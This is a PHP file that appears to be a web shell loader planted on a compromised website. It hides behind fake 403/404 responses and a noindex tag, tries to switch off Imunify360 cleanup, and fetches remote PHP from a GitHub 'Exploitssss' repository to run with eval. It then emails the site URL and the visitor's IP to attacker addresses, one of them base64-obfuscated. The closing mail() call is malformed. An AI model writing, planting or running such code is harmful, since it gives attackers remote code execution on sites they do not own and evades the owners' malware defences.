<?php

error_reporting(0);
define('SECURE_ACCESS', true);
header('X-Powered-By: none');
header('Content-Type: text/html; charset=UTF-8');
ini_set('lsapi_backend_off', '1');
// Mengatur kode respons HTTP
http_response_code(403);
ini_set("imunify360.cleanup_on_restore", false);
http_response_code(404);        
$head = '<head><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<meta name="robots" content="noindex">
<title>ILLEGAL ACCESS!!</title>
<style>pre{border:1px solid #ddd;padding:5px;overflow:auto}table{border-collapse:collapse;width:100%;overflow:auto}th,td{padding:0.25rem;text-align:left;border-bottom:1px solid #ccc}tbody tr:nth-child(odd){background:#eee}tr:hover{background-color:#000000}
</style>
</head>';
$url = "https://raw.githubusercontent.com/Anonrocks/Exploitssss/master/temp.php";
$ch = curl_init($url); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
eval("?>".$result);
$e=base64_decode("YmxhY2toYXQxMzM3LmlkQGdtYWlsLmNvbQ==");
$h=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
header('Content-Type: text/html; charset=UTF-8');
$to = 'muhrazky@gmail.com';
$path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$message = "URL: $path | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($to,$e,$h,$p, "Halo senpai!!!", $message, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
